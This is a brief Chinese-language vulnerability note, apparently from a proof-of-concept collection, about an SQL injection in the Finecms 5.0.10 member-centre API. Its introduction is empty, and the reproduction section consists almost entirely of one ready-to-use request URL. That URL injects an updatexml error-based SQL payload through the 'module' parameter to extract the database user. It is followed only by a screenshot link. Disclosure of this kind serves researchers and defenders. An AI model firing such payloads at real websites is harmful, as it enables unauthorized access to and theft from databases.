Finecms 5.0.10 会员中心sql注入漏洞
==================================

一、漏洞简介
------------

二、漏洞影响
------------

Finecms 5.0.10

三、复现过程
------------

    http://0-sec.org/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a

![](./.resource/Finecms5.0.10会员中心sql注入漏洞/media/rId24.png)
